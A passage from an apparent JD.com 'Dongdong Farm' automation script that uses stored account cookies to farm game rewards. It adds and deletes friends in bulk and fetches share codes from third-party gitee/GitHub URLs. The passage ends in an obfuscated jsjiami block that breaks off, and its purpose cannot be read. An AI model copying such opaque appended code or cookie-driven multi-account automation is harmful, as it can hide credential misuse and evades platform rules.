    if (!$.getdata(helpSuccessPeoplesKey)) {
      //把前一天的清除
      $.setdata('', timeFormat(Date.now() - 24 * 60 * 60 * 1000) + $.farmInfo.farmUserPro.shareCode);
      $.setdata('', helpSuccessPeoplesKey);
    }
    if (helpSuccessPeoples) {
      if ($.getdata(helpSuccessPeoplesKey)) {
        $.setdata($.getdata(helpSuccessPeoplesKey) + ',' + helpSuccessPeoples, helpSuccessPeoplesKey);
      } else {
        $.setdata(helpSuccessPeoples, helpSuccessPeoplesKey);
      }
    }
    helpSuccessPeoples = $.getdata(helpSuccessPeoplesKey);
  }
  if (helpSuccessPeoples && helpSuccessPeoples.length > 0) {
    message += `【您助力的好友👬】${helpSuccessPeoples.substr(0, helpSuccessPeoples.length - 1)}\n`;
  }
  if (salveHelpAddWater > 0) {
    // message += `【助力好友👬】获得${salveHelpAddWater}g💧\n`;
    console.log(`【助力好友👬】获得${salveHelpAddWater}g💧\n`);
  }
  message += `【今日剩余助力👬】${remainTimes}次\n`;
  console.log('助力好友结束，即将开始领取额外水滴奖励\n');
}
//水滴雨
async function executeWaterRains() {
  let executeWaterRain = !$.farmTask.waterRainInit.f;
  if (executeWaterRain) {
    console.log(`水滴雨任务，每天两次，最多可得10g水滴`);
    console.log(`两次水滴雨任务是否全部完成：${$.farmTask.waterRainInit.f ? '是' : '否'}`);
    if ($.farmTask.waterRainInit.lastTime) {
      if (Date.now() < ($.farmTask.waterRainInit.lastTime + 3 * 60 * 60 * 1000)) {
        executeWaterRain = false;
        // message += `【第${$.farmTask.waterRainInit.winTimes + 1}次水滴雨】未到时间，请${new Date($.farmTask.waterRainInit.lastTime + 3 * 60 * 60 * 1000).toLocaleTimeString()}再试\n`;
        console.log(`\`【第${$.farmTask.waterRainInit.winTimes + 1}次水滴雨】未到时间，请${new Date($.farmTask.waterRainInit.lastTime + 3 * 60 * 60 * 1000).toLocaleTimeString()}再试\n`);
      }
    }
    if (executeWaterRain) {
      console.log(`开始水滴雨任务,这是第${$.farmTask.waterRainInit.winTimes + 1}次，剩余${2 - ($.farmTask.waterRainInit.winTimes + 1)}次`);
      await waterRainForFarm();
      console.log('水滴雨waterRain');
      if ($.waterRain.code === '0') {
        console.log('水滴雨任务执行成功，获得水滴：' + $.waterRain.addEnergy + 'g');
        console.log(`【第${$.farmTask.waterRainInit.winTimes + 1}次水滴雨】获得${$.waterRain.addEnergy}g水滴\n`);
        // message += `【第${$.farmTask.waterRainInit.winTimes + 1}次水滴雨】获得${$.waterRain.addEnergy}g水滴\n`;
      }
    }
  } else {
    // message += `【水滴雨】已全部完成，获得20g💧\n`;
  }
}
//打卡领水活动
async function clockInIn() {
  console.log('开始打卡领水活动（签到，关注，领券）');
  await clockInInitForFarm();
  if ($.clockInInit.code === '0') {
    // 签到得水滴
    if (!$.clockInInit.todaySigned) {
      console.log('开始今日签到');
      await clockInForFarm();
      console.log(`打卡结果${JSON.stringify($.clockInForFarmRes)}`);
      if ($.clockInForFarmRes.code === '0') {
        // message += `【第${$.clockInForFarmRes.signDay}天签到】获得${$.clockInForFarmRes.amount}g💧\n`;
        console.log(`【第${$.clockInForFarmRes.signDay}天签到】获得${$.clockInForFarmRes.amount}g💧\n`)
        if ($.clockInForFarmRes.signDay === 7) {
          //可以领取惊喜礼包
          console.log('开始领取--惊喜礼包38g水滴');
          await gotClockInGift();
          if ($.gotClockInGiftRes.code === '0') {
            // message += `【惊喜礼包】获得${$.gotClockInGiftRes.amount}g💧\n`;
            console.log(`【惊喜礼包】获得${$.gotClockInGiftRes.amount}g💧\n`);
          }
        }
      }
    }
    if ($.clockInInit.todaySigned && $.clockInInit.totalSigned === 7) {
      console.log('开始领取--惊喜礼包38g水滴');
      await gotClockInGift();
      if ($.gotClockInGiftRes.code === '0') {
        // message += `【惊喜礼包】获得${$.gotClockInGiftRes.amount}g💧\n`;
        console.log(`【惊喜礼包】获得${$.gotClockInGiftRes.amount}g💧\n`);
      }
    }
    // 限时关注得水滴
    if ($.clockInInit.themes && $.clockInInit.themes.length > 0) {
      for (let item of $.clockInInit.themes) {
        if (!item.hadGot) {
          console.log(`关注ID${item.id}`);
          await clockInFollowForFarm(item.id, "theme", "1");
          console.log(`themeStep1--结果${JSON.stringify($.themeStep1)}`);
          if ($.themeStep1.code === '0') {
            await clockInFollowForFarm(item.id, "theme", "2");
            console.log(`themeStep2--结果${JSON.stringify($.themeStep2)}`);
            if ($.themeStep2.code === '0') {
              console.log(`关注${item.name}，获得水滴${$.themeStep2.amount}g`);
            }
          }
        }
      }
    }
    // 限时领券得水滴
    if ($.clockInInit.venderCoupons && $.clockInInit.venderCoupons.length > 0) {
      for (let item of $.clockInInit.venderCoupons) {
        if (!item.hadGot) {
          console.log(`领券的ID${item.id}`);
          await clockInFollowForFarm(item.id, "venderCoupon", "1");
          console.log(`venderCouponStep1--结果${JSON.stringify($.venderCouponStep1)}`);
          if ($.venderCouponStep1.code === '0') {
            await clockInFollowForFarm(item.id, "venderCoupon", "2");
            if ($.venderCouponStep2.code === '0') {
              console.log(`venderCouponStep2--结果${JSON.stringify($.venderCouponStep2)}`);
              console.log(`从${item.name}领券，获得水滴${$.venderCouponStep2.amount}g`);
            }
          }
        }
      }
    }
  }
  console.log('开始打卡领水活动（签到，关注，领券）结束\n');
}
//
async function getAwardInviteFriend() {
  await friendListInitForFarm();//查询好友列表
  //console.log(`查询好友列表数据：${JSON.stringify($.friendList)}\n`)
  if ($.friendList) {
    console.log(`\n今日已邀请好友${$.friendList.inviteFriendCount}个 / 每日邀请上限${$.friendList.inviteFriendMax}个`);
    console.log(`开始删除${$.friendList.friends && $.friendList.friends.length}个好友,可拿每天的邀请奖励`);
    if ($.friendList.friends && $.friendList.friends.length > 0) {
      for (let friend of $.friendList.friends) {
        console.log(`\n开始删除好友 [${friend.shareCode}]`);
        const deleteFriendForFarm = await request('deleteFriendForFarm', { "shareCode": `${friend.shareCode}`,"version":8,"channel":1 });
        if (deleteFriendForFarm && deleteFriendForFarm.code === '0') {
          console.log(`删除好友 [${friend.shareCode}] 成功\n`);
        }
      }
    }
    await receiveFriendInvite();//为他人助力,接受邀请成为别人的好友
    if ($.friendList.inviteFriendCount > 0) {
      if ($.friendList.inviteFriendCount > $.friendList.inviteFriendGotAwardCount) {
        console.log('开始领取邀请好友的奖励');
        await awardInviteFriendForFarm();
        console.log(`领取邀请好友的奖励结果：：${JSON.stringify($.awardInviteFriendRes)}`);
      }
    } else {
      console.log('今日未邀请过好友')
    }
  } else {
    console.log(`查询好友列表失败\n`);
  }
}
//给好友浇水
async function doFriendsWater() {
  await friendListInitForFarm();
  console.log('开始给好友浇水...');
  await taskInitForFarm();
  const { waterFriendCountKey, waterFriendMax } = $.farmTask.waterFriendTaskInit;
  console.log(`今日已给${waterFriendCountKey}个好友浇水`);
  if (waterFriendCountKey < waterFriendMax) {
    let needWaterFriends = [];
    if ($.friendList.friends && $.friendList.friends.length > 0) {
      $.friendList.friends.map((item, index) => {
        if (item.friendState === 1) {
          if (needWaterFriends.length < (waterFriendMax - waterFriendCountKey)) {
            needWaterFriends.push(item.shareCode);
          }
        }
      });
      //TODO ,发现bug,github action运行发现有些账号第一次没有给3个好友浇水
      console.log(`需要浇水的好友列表shareCodes:${JSON.stringify(needWaterFriends)}`);
      let waterFriendsCount = 0, cardInfoStr = '';
      for (let index = 0; index < needWaterFriends.length; index ++) {
        await waterFriendForFarm(needWaterFriends[index]);
        console.log(`为第${index+1}个好友浇水结果:${JSON.stringify($.waterFriendForFarmRes)}\n`)
        if ($.waterFriendForFarmRes.code === '0') {
          waterFriendsCount ++;
          if ($.waterFriendForFarmRes.cardInfo) {
            console.log('为好友浇水获得道具了');
            if ($.waterFriendForFarmRes.cardInfo.type === 'beanCard') {
              console.log(`获取道具卡:${$.waterFriendForFarmRes.cardInfo.rule}`);
              cardInfoStr += `水滴换豆卡,`;
            } else if ($.waterFriendForFarmRes.cardInfo.type === 'fastCard') {
              console.log(`获取道具卡:${$.waterFriendForFarmRes.cardInfo.rule}`);
              cardInfoStr += `快速浇水卡,`;
            } else if ($.waterFriendForFarmRes.cardInfo.type === 'doubleCard') {
              console.log(`获取道具卡:${$.waterFriendForFarmRes.cardInfo.rule}`);
              cardInfoStr += `水滴翻倍卡,`;
            } else if ($.waterFriendForFarmRes.cardInfo.type === 'signCard') {
              console.log(`获取道具卡:${$.waterFriendForFarmRes.cardInfo.rule}`);
              cardInfoStr += `加签卡,`;
            }
          }
        } else if ($.waterFriendForFarmRes.code === '11') {
          console.log('水滴不够,跳出浇水')
        }
      }
      // message += `【好友浇水】已给${waterFriendsCount}个好友浇水,消耗${waterFriendsCount * 10}g水\n`;
      console.log(`【好友浇水】已给${waterFriendsCount}个好友浇水,消耗${waterFriendsCount * 10}g水\n`);
      if (cardInfoStr && cardInfoStr.length > 0) {
        // message += `【好友浇水奖励】${cardInfoStr.substr(0, cardInfoStr.length - 1)}\n`;
        console.log(`【好友浇水奖励】${cardInfoStr.substr(0, cardInfoStr.length - 1)}\n`);
      }
    } else {
      console.log('您的好友列表暂无好友,快去邀请您的好友吧!')
    }
  } else {
    console.log(`今日已为好友浇水量已达${waterFriendMax}个`)
  }
}
//领取给3个好友浇水后的奖励水滴
async function getWaterFriendGotAward() {
  await taskInitForFarm();
  const { waterFriendCountKey, waterFriendMax, waterFriendSendWater, waterFriendGotAward } = $.farmTask.waterFriendTaskInit
  if (waterFriendCountKey >= waterFriendMax) {
    if (!waterFriendGotAward) {
      await waterFriendGotAwardForFarm();
      console.log(`领取给${waterFriendMax}个好友浇水后的奖励水滴::${JSON.stringify($.waterFriendGotAwardRes)}`)
      if ($.waterFriendGotAwardRes.code === '0') {
        // message += `【给${waterFriendMax}好友浇水】奖励${$.waterFriendGotAwardRes.addWater}g水滴\n`;
        console.log(`【给${waterFriendMax}好友浇水】奖励${$.waterFriendGotAwardRes.addWater}g水滴\n`);
      }
    } else {
      console.log(`给好友浇水的${waterFriendSendWater}g水滴奖励已领取\n`);
      // message += `【给${waterFriendMax}好友浇水】奖励${waterFriendSendWater}g水滴已领取\n`;
    }
  } else {
    console.log(`暂未给${waterFriendMax}个好友浇水\n`);
  }
}
//接收成为对方好友的邀请
async function receiveFriendInvite() {
  for (let code of newShareCodes) {
    if (code === $.farmInfo.farmUserPro.shareCode) {
      console.log('自己不能邀请自己成为好友噢\n')
      continue
    }
    await inviteFriend(code);
    // console.log(`接收邀请成为好友结果:${JSON.stringify($.inviteFriendRes.helpResult)}`)
    if ($.inviteFriendRes.helpResult.code === '0') {
      console.log(`接收邀请成为好友结果成功,您已成为${$.inviteFriendRes.helpResult.masterUserInfo.nickName}的好友`)
    } else if ($.inviteFriendRes.helpResult.code === '17') {
      console.log(`接收邀请成为好友结果失败,对方已是您的好友`)
    }
  }
  // console.log(`开始接受6fbd26cc27ac44d6a7fed34092453f77的邀请\n`)
  // await inviteFriend('6fbd26cc27ac44d6a7fed34092453f77');
  // console.log(`接收邀请成为好友结果:${JSON.stringify($.inviteFriendRes.helpResult)}`)
  // if ($.inviteFriendRes.helpResult.code === '0') {
  //   console.log(`您已成为${$.inviteFriendRes.helpResult.masterUserInfo.nickName}的好友`)
  // } else if ($.inviteFriendRes.helpResult.code === '17') {
  //   console.log(`对方已是您的好友`)
  // }
}
async function duck() {
  for (let i = 0; i < 10; i++) {
    //这里循环十次
    await getFullCollectionReward();
    if ($.duckRes.code === '0') {
      if (!$.duckRes.hasLimit) {
        console.log(`小鸭子游戏:${$.duckRes.title}`);
        // if ($.duckRes.type !== 3) {
        //   console.log(`${$.duckRes.title}`);
        //   if ($.duckRes.type === 1) {
        //     message += `【小鸭子】为你带回了水滴\n`;
        //   } else if ($.duckRes.type === 2) {
        //     message += `【小鸭子】为你带回快速浇水卡\n`
        //   }
        // }
      } else {
        console.log(`${$.duckRes.title}`)
        break;
      }
    } else if ($.duckRes.code === '10') {
      console.log(`小鸭子游戏达到上限`)
      break;
    }
  }
}
// ========================API调用接口========================
//鸭子，点我有惊喜
async function getFullCollectionReward() {
  return new Promise(resolve => {
    const body = {"type": 2, "version": 6, "channel": 2};
    $.post(taskUrl("getFullCollectionReward", body), (err, resp, data) => {
      try {
        if (err) {
          console.log('\n东东农场: API查询请求失败 ‼️‼️');
          console.log(JSON.stringify(err));
          $.logErr(err);
        } else {
          if (safeGet(data)) {
            $.duckRes = JSON.parse(data);
          }
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve();
      }
    })
  })
}

/**
 * 领取10次浇水奖励API
 */
async function totalWaterTaskForFarm() {
  const functionId = arguments.callee.name.toString();
  $.totalWaterReward = await request(functionId);
}
//领取首次浇水奖励API
async function firstWaterTaskForFarm() {
  const functionId = arguments.callee.name.toString();
  $.firstWaterReward = await request(functionId);
}
//领取给3个好友浇水后的奖励水滴API
async function waterFriendGotAwardForFarm() {
  const functionId = arguments.callee.name.toString();
  $.waterFriendGotAwardRes = await request(functionId, {"version": 4, "channel": 1});
}
// 查询背包道具卡API
async function myCardInfoForFarm() {
  const functionId = arguments.callee.name.toString();
  $.myCardInfoRes = await request(functionId, {"version": 5, "channel": 1});
}
//使用道具卡API
async function userMyCardForFarm(cardType) {
  const functionId = arguments.callee.name.toString();
  $.userMyCardRes = await request(functionId, {"cardType": cardType});
}
/**
 * 领取浇水过程中的阶段性奖励
 * @param type
 * @returns {Promise<void>}
 */
async function gotStageAwardForFarm(type) {
  $.gotStageAwardForFarmRes = await request(arguments.callee.name.toString(), {'type': type});
}
//浇水API
async function waterGoodForFarm() {
  await $.wait(1000);
  console.log('等待了1秒');

  const functionId = arguments.callee.name.toString();
  $.waterResult = await request(functionId);
}
// 初始化集卡抽奖活动数据API
async function initForTurntableFarm() {
  $.initForTurntableFarmRes = await request(arguments.callee.name.toString(), {version: 4, channel: 1});
}
async function lotteryForTurntableFarm() {
  await $.wait(2000);
  console.log('等待了2秒');
  $.lotteryRes = await request(arguments.callee.name.toString(), {type: 1, version: 4, channel: 1});
}

async function timingAwardForTurntableFarm() {
  $.timingAwardRes = await request(arguments.callee.name.toString(), {version: 4, channel: 1});
}

async function browserForTurntableFarm(type, adId) {
  if (type === 1) {
    console.log('浏览爆品会场');
  }
  if (type === 2) {
    console.log('天天抽奖浏览任务领取水滴');
  }
  const body = {"type": type,"adId": adId,"version":4,"channel":1};
  $.browserForTurntableFarmRes = await request(arguments.callee.name.toString(), body);
  // 浏览爆品会场8秒
}
//天天抽奖浏览任务领取水滴API
async function browserForTurntableFarm2(type) {
  const body = {"type":2,"adId": type,"version":4,"channel":1};
  $.browserForTurntableFarm2Res = await request('browserForTurntableFarm', body);
}
/**
 * 天天抽奖拿好礼-助力API(每人每天三次助力机会)
 */
async function lotteryMasterHelp() {
  $.lotteryMasterHelpRes = await request(`initForFarm`, {
    imageUrl: "",
    nickName: "",
    shareCode: arguments[0] + '-3',
    babelChannel: "3",
    version: 4,
    channel: 1
  });
}

//领取5人助力后的额外奖励API
async function masterGotFinishedTaskForFarm() {
  const functionId = arguments.callee.name.toString();
  $.masterGotFinished = await request(functionId);
}
//助力好友信息API
async function masterHelpTaskInitForFarm() {
  const functionId = arguments.callee.name.toString();
  $.masterHelpResult = await request(functionId);
}
//接受对方邀请,成为对方好友的API
async function inviteFriend() {
  $.inviteFriendRes = await request(`initForFarm`, {
    imageUrl: "",
    nickName: "",
    shareCode: arguments[0] + '-inviteFriend',
    version: 4,
    channel: 2
  });
}
// 助力好友API
async function masterHelp() {
  $.helpResult = await request(`initForFarm`, {
    imageUrl: "",
    nickName: "",
    shareCode: arguments[0],
    babelChannel: "3",
    version: 2,
    channel: 1
  });
}
/**
 * 水滴雨API
 */
async function waterRainForFarm() {
  const functionId = arguments.callee.name.toString();
  const body = {"type": 1, "hongBaoTimes": 100, "version": 3};
  $.waterRain = await request(functionId, body);
}
/**
 * 打卡领水API
 */
async function clockInInitForFarm() {
  const functionId = arguments.callee.name.toString();
  $.clockInInit = await request(functionId);
}

// 连续签到API
async function clockInForFarm() {
  const functionId = arguments.callee.name.toString();
  $.clockInForFarmRes = await request(functionId, {"type": 1});
}

//关注，领券等API
async function clockInFollowForFarm(id, type, step) {
  const functionId = arguments.callee.name.toString();
  let body = {
    id,
    type,
    step
  }
  if (type === 'theme') {
    if (step === '1') {
      $.themeStep1 = await request(functionId, body);
    } else if (step === '2') {
      $.themeStep2 = await request(functionId, body);
    }
  } else if (type === 'venderCoupon') {
    if (step === '1') {
      $.venderCouponStep1 = await request(functionId, body);
    } else if (step === '2') {
      $.venderCouponStep2 = await request(functionId, body);
    }
  }
}

// 领取连续签到7天的惊喜礼包API
async function gotClockInGift() {
  $.gotClockInGiftRes = await request('clockInForFarm', {"type": 2})
}

//定时领水API
async function gotThreeMealForFarm() {
  const functionId = arguments.callee.name.toString();
  $.threeMeal = await request(functionId);
}
/**
 * 浏览广告任务API
 * type为0时, 完成浏览任务
 * type为1时, 领取浏览任务奖励
 */
async function browseAdTaskForFarm(advertId, type) {
  const functionId = arguments.callee.name.toString();
  if (type === 0) {
    $.browseResult = await request(functionId, {advertId, type});
  } else if (type === 1) {
    $.browseRwardResult = await request(functionId, {advertId, type});
  }
}
// 被水滴砸中API
async function gotWaterGoalTaskForFarm() {
  $.goalResult = await request(arguments.callee.name.toString(), {type: 3});
}
//签到API
async function signForFarm() {
  const functionId = arguments.callee.name.toString();
  $.signResult = await request(functionId);
}
/**
 * 初始化农场, 可获取果树及用户信息API
 */
async function initForFarm() {
  return new Promise(resolve => {
    const option =  {
      url: `${JD_API_HOST}?functionId=initForFarm`,
      body: `body=${escape(JSON.stringify({"version":4}))}&appid=wh5&clientVersion=9.1.0`,
      headers: {
        "accept": "*/*",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "zh-CN,zh;q=0.9",
        "cache-control": "no-cache",
        "cookie": cookie,
        "origin": "https://home.m.jd.com",
        "pragma": "no-cache",
        "referer": "https://home.m.jd.com/myJd/newhome.action",
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-site",
        "User-Agent": $.isNode() ? (process.env.JD_USER_AGENT ? process.env.JD_USER_AGENT : (require('./USER_AGENTS').USER_AGENT)) : ($.getdata('JDUA') ? $.getdata('JDUA') : "jdapp;iPhone;9.2.2;14.2;%E4%BA%AC%E4%B8%9C/9.2.2 CFNetwork/1206 Darwin/20.1.0"),
        "Content-Type": "application/x-www-form-urlencoded"
      },
      timeout: 10000,
    };
    $.post(option, (err, resp, data) => {
      try {
        if (err) {
          console.log('\n东东农场: API查询请求失败 ‼️‼️');
          console.log(JSON.stringify(err));
          $.logErr(err);
        } else {
          if (safeGet(data)) {
            $.farmInfo = JSON.parse(data)
          }
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve();
      }
    })
  })
}

// 初始化任务列表API
async function taskInitForFarm() {
  console.log('\n初始化任务列表')
  const functionId = arguments.callee.name.toString();
  $.farmTask = await request(functionId);
}
//获取好友列表API
async function friendListInitForFarm() {
  $.friendList = await request('friendListInitForFarm', {"version": 4, "channel": 1});
  // console.log('aa', aa);
}
// 领取邀请好友的奖励API
async function awardInviteFriendForFarm() {
  $.awardInviteFriendRes = await request('awardInviteFriendForFarm');
}
//为好友浇水API
async function waterFriendForFarm(shareCode) {
  const body = {"shareCode": shareCode, "version": 6, "channel": 1}
  $.waterFriendForFarmRes = await request('waterFriendForFarm', body);
}
async function showMsg() {
  if ($.isNode() && process.env.FRUIT_NOTIFY_CONTROL) {
    $.ctrTemp = `${process.env.FRUIT_NOTIFY_CONTROL}` === 'false';
  } else if ($.getdata('jdFruitNotify')) {
    $.ctrTemp = $.getdata('jdFruitNotify') === 'false';
  } else {
    $.ctrTemp = `${jdNotify}` === 'false';
  }
  if ($.ctrTemp) {
    $.msg($.name, subTitle, message, option);
    if ($.isNode()) {
      allMessage += `${subTitle}\n${message}${$.index !== cookiesArr.length ? '\n\n' : ''}`;
      // await notify.sendNotify(`${$.name} - 账号${$.index} - ${$.nickName}`, `${subTitle}\n${message}`);
    }
  } else {
    $.log(`\n${message}\n`);
  }
}

function timeFormat(time) {
  let date;
  if (time) {
    date = new Date(time)
  } else {
    date = new Date();
  }
  return date.getFullYear() + '-' + ((date.getMonth() + 1) >= 10 ? (date.getMonth() + 1) : '0' + (date.getMonth() + 1)) + '-' + (date.getDate() >= 10 ? date.getDate() : '0' + date.getDate());
}
function readShareCode() {
  console.log(`开始`)
  return new Promise(async resolve => {
    $.get({url: "https://gitee.com/Soundantony/RandomShareCode/raw/master/JD_Fruit.json",headers:{
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1 Edg/87.0.4280.88"
      }}, async (err, resp, data) => {
      try {
        if (err) {
          console.log(`${JSON.stringify(err)}`)
          console.log(`${$.name} API请求失败，将切换为备用API`)
          console.log(`随机取助力码放到您固定的互助码后面(不影响已有固定互助)`)
          $.get({url: `https://raw.githubusercontent.com/shuyeshuye/RandomShareCode/main/JD_Fruit.json`, 'timeout': 10000},(err, resp, data)=>{
          data = JSON.parse(data);})
        } else {
          if (data) {
            console.log(`随机取助力码放到您固定的互助码后面(不影响已有固定互助)`)
            data = JSON.parse(data);
          }
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve(data);
      }
    })
    await $.wait(10000);
    resolve()
  })
}
function shareCodesFormat() {
  return new Promise(async resolve => {
    // console.log(`第${$.index}个京东账号的助力码:::${jdFruitShareArr[$.index - 1]}`)
    newShareCodes = [];
    if (jdFruitShareArr[$.index - 1]) {
      newShareCodes = jdFruitShareArr[$.index - 1].split('@');
    } else {
      console.log(`由于您第${$.index}个京东账号未提供shareCode,将采纳本脚本自带的助力码\n`)
      const tempIndex = $.index > shareCodes.length ? (shareCodes.length - 1) : ($.index - 1);
      newShareCodes = shareCodes[tempIndex].split('@');
    }
    const readShareCodeRes = await readShareCode();
    if (readShareCodeRes && readShareCodeRes.code === 200) {
      // newShareCodes = newShareCodes.concat(readShareCodeRes.data || []);
      newShareCodes = [...new Set([...newShareCodes, ...(readShareCodeRes.data || [])])];
    }
    console.log(`第${$.index}个京东账号将要助力的好友${JSON.stringify(newShareCodes)}`)
    resolve();
  })
}
function requireConfig() {
  return new Promise(resolve => {
    console.log('开始获取配置文件\n')
    notify = $.isNode() ? require('./sendNotify') : '';
    //Node.js用户请在jdCookie.js处填写京东ck;
    const jdCookieNode = $.isNode() ? require('./jdCookie.js') : '';
    const jdFruitShareCodes = $.isNode() ? require('./jdFruitShareCodes.js') : '';
    //IOS等用户直接用NobyDa的jd cookie
    if ($.isNode()) {
      Object.keys(jdCookieNode).forEach((item) => {
        if (jdCookieNode[item]) {
          cookiesArr.push(jdCookieNode[item])
        }
      })
      if (process.env.JD_DEBUG && process.env.JD_DEBUG === 'false') console.log = () => {};
    } else {
      let cookiesData = $.getdata('CookiesJD') || "[]";
      cookiesData = jsonParse(cookiesData);
      cookiesArr = cookiesData.map(item => item.cookie);
      cookiesArr.reverse();
      cookiesArr.push(...[$.getdata('CookieJD2'), $.getdata('CookieJD')]);
      cookiesArr.reverse();
      cookiesArr = cookiesArr.filter(item => item !== "" && item !== null && item !== undefined);
    }
    console.log(`共${cookiesArr.length}个京东账号\n`)
    if ($.isNode()) {
      Object.keys(jdFruitShareCodes).forEach((item) => {
        if (jdFruitShareCodes[item]) {
          jdFruitShareArr.push(jdFruitShareCodes[item])
        }
      })
    } else {
      const boxShareCodeArr = ['jd_fruit1', 'jd_fruit2', 'jd_fruit3', 'jd_fruit4'];
      const boxShareCodeArr2 = ['jd2_fruit1', 'jd2_fruit2', 'jd2_fruit3', 'jd2_fruit4'];
      const isBox1 = boxShareCodeArr.some((item) => {
        const boxShareCode = $.getdata(item);
        return (boxShareCode !== undefined && boxShareCode !== null && boxShareCode !== '');
      });
      const isBox2 = boxShareCodeArr2.some((item) => {
        const boxShareCode = $.getdata(item);
        return (boxShareCode !== undefined && boxShareCode !== null && boxShareCode !== '');
      });
      isBox = isBox1 ? isBox1 : isBox2;
      if (isBox1) {
        let temp = [];
        for (const item of boxShareCodeArr) {
          if ($.getdata(item)) {
            temp.push($.getdata(item))
          }
        }
        jdFruitShareArr.push(temp.join('@'));
      }
      if (isBox2) {
        let temp = [];
        for (const item of boxShareCodeArr2) {
          if ($.getdata(item)) {
            temp.push($.getdata(item))
          }
        }
        jdFruitShareArr.push(temp.join('@'));
      }
    }
    // console.log(`jdFruitShareArr::${JSON.stringify(jdFruitShareArr)}`)
    // console.log(`jdFruitShareArr账号长度::${jdFruitShareArr.length}`)
    console.log(`您提供了${jdFruitShareArr.length}个账号的农场助力码\n`);
    resolve()
  })
}
function TotalBean() {
  return new Promise(async resolve => {
    const options = {
      "url": `https://wq.jd.com/user/info/QueryJDUserInfo?sceneval=2`,
      "headers": {
        "Accept": "application/json,text/plain, */*",
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "zh-cn",
        "Connection": "keep-alive",
        "Cookie": cookie,
        "Referer": "https://wqs.jd.com/my/jingdou/my.shtml?sceneval=2",
        "User-Agent": $.isNode() ? (process.env.JD_USER_AGENT ? process.env.JD_USER_AGENT : (require('./USER_AGENTS').USER_AGENT)) : ($.getdata('JDUA') ? $.getdata('JDUA') : "jdapp;iPhone;9.2.2;14.2;%E4%BA%AC%E4%B8%9C/9.2.2 CFNetwork/1206 Darwin/20.1.0")
      },
      "timeout": 10000,
    }
    $.post(options, (err, resp, data) => {
      try {
        if (err) {
          console.log(`${JSON.stringify(err)}`)
          console.log(`${$.name} API请求失败，请检查网路重试`)
        } else {
          if (data) {
            data = JSON.parse(data);
            if (data['retcode'] === 13) {
              $.isLogin = false; //cookie过期
              return
            }
            if (data['retcode'] === 0) {
              $.nickName = data['base'].nickname;
            } else {
              $.nickName = $.UserName
            }
          } else {
            console.log(`京东服务器返回空数据`)
          }
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve();
      }
    })
  })
}
function request(function_id, body = {}, timeout = 1000){
  return new Promise(resolve => {
    setTimeout(() => {
      $.get(taskUrl(function_id, body), (err, resp, data) => {
        try {
          if (err) {
            console.log('\n东东农场: API查询请求失败 ‼️‼️')
            console.log(JSON.stringify(err));
            console.log(`function_id:${function_id}`)
            $.logErr(err);
          } else {
            if (safeGet(data)) {
              data = JSON.parse(data);
            }
          }
        } catch (e) {
          $.logErr(e, resp);
        } finally {
          resolve(data);
        }
      })
    }, timeout)
  })
}
function safeGet(data) {
  try {
    if (typeof JSON.parse(data) == "object") {
      return true;
    }
  } catch (e) {
    console.log(e);
    console.log(`京东服务器访问数据为空，请检查自身设备网络情况`);
    return false;
  }
}
function taskUrl(function_id, body = {}) {
  return {
    url: `${JD_API_HOST}?functionId=${function_id}&appid=wh5&body=${escape(JSON.stringify(body))}`,
    headers: {
      Cookie: cookie,
      UserAgent: $.isNode() ? (process.env.JD_USER_AGENT ? process.env.JD_USER_AGENT : (require('./USER_AGENTS').USER_AGENT)) : ($.getdata('JDUA') ? $.getdata('JDUA') : "jdapp;iPhone;9.2.2;14.2;%E4%BA%AC%E4%B8%9C/9.2.2 CFNetwork/1206 Darwin/20.1.0"),
    },
    timeout: 10000,
  }
}
function jsonParse(str) {
  if (typeof str == "string") {
    try {
      return JSON.parse(str);
    } catch (e) {
      console.log(e);
      $.msg($.name, '', '请勿随意在BoxJs输入框修改内容\n建议通过脚本去获取cookie')
      return [];
    }
  }
}
var _0xodY='jsjiami.com.v6',_0x1b8b=[_0xodY,'IcKzw6wUIQ==','w5E+Q30G','E0TCoMOMw44=','w6DDnMK4w6vDvGg=','wrLCtMOP','wr/DrF3CvxhxKcKEw5AdwqbDqDY=','w4ILwoE=','c2vCq8KrBMOJw600w6rCvcKtUxg=','wqLCrhFKw7w=','QQMSD3M=','NcKLw6PCo0owcMK2Iyk=','wpLDjXbCjipAGg==','wovCssKvLCY=','VcKOd2nDiA7DsQ==','w7rDkcOcegU=','w7FcwpAqwqjCmwLCqMOFdMKqwoxvLA4Jw4jCu8OXcxTCmCYHRMOqO8Kaw4nCk0XDjsONKQnDhsOCAcOrX8OawpVXwppCw4fCvcOAAwgXblHCrGvDnTB1w4fDnsOlVn1Dw5bCmHoVwpPChwXCoj3CnRYPCzfCuAbCpGPChwXCvUx0ag4=','w5o5WnAS','w4EQwpnCvy7Cj13CscKjwqVgwrMYecOswrZWw4Vow5HDjl7Dt28PB8KyfmkfwoPCpsKiOMKHOndifi9Zw7TCm8Ku','w4MkZsOZwpAZwrvCkMKIBMKXwrw7w4hIw7HDusOJTn5pw4rDh8OawrTCk8KRN8OSTsORdcKDwrouw4HDiSEvw6bDr0EuUsOsIh7CmmbDlcKKw6V6PH9dw4vCjidhw5bCvMOsMVNBw4fCmkQjQyTCusOGw64pw4h2OcK6FlTChMKrH1g=','w7UhYVE1','w4LDi8K1w4vDjQ==','wp/CmsKQw4HCnw==','wpzDkcKPwoBU','w4TDv8OLw6ow','EMOuf8Owwr4=','wqHCrcOaw4rCow==','wpbCh8O/w7/CgQ==','woQHTMK2fw==','ecKPQELDvA==','w6djwoIPw7M=','w7gudFES','OnfCnxrDhw==','wq/Ch8Oow5HCuA==','w6fDg8OidR4=','wqfCscOrw68=','wos2e3HCpQ==','N20KwpMR','eS4+H1Q=','wqfCv8Oqw6jCtg==','LhTCtgtG','wrtnw5XCpWo=','NMKUw6Q1FQ==','IGvCug==','wqEZwrHCvQ==','woLDplLCleisvOayveWlu+i3ou+9qOiup+ahmuadrOe+qei0o+mEh+istg==','RgcvMkw=','wpJkKsOdwrk=','w7bDrEXDv0